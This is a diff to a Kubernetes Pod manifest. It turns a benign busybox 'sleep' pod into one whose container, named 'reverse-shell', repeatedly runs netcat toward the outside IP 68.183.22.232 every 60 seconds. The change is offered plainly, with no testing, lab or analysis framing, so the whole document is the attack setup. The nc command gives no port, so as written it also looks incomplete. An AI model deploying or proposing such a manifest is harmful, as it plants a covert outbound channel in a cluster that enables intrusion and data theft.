@@ -1,11 +1,14 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: busybox-pod
-  namespace: nati
+  generateName: test-
+  namespace: default
 spec:
+  restartPolicy: Never
   containers:
-  - name: busybox
+  - name: reverse-shell
     image: busybox
-    command: ["sleep", "3600"]
-  serviceAccountName: nati-service-account
+    command: ["sh", "-c"]
+    args: [
+      "while true; do nc 68.183.22.232; sleep 60; done"
+    ]
